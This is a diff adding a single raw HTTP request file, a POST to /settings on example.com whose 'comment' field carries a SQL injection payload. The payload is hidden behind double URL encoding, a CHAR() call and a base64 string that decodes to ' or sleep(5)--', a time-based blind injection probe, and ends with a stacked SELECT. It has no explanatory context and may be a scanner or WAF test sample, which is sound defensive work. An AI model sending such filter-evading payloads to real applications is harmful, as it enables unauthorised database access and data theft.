@@ -1,0 +1,9 @@
+POST /settings HTTP/1.1
+Host: example.com
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36
+Accept: */*
+Connection: close
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 141
+
+comment=%27%252520CHAR%2879%2C82%29%252520decode%28%27IG9yIHNsZWVwKDUpLS0%3D%27%2C%252520%27base64%27%29--%3B%252520SELECT%2525201%2C%2525202
